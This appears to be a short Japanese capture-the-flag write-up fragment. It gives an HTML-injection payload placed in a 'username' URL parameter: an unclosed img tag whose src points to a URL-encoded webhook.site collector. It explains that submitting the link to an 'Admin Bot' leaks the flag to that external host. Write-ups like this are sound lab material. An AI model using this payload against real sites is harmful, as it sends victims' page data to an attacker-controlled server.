ペイロードは以下。

http://web:3000/?username=%3Cimg%20src%3D%22[webhook.siteなどのURL]%2F%3F

webhook.siteのURLは以下の様にURLエンコードしておく。

https%3A%2F%2Fwebhook.site%2F[UUID]

これをAdmin Botに入れて送信し、webhook.siteでリクエスト内容を確認するとフラグが分かる。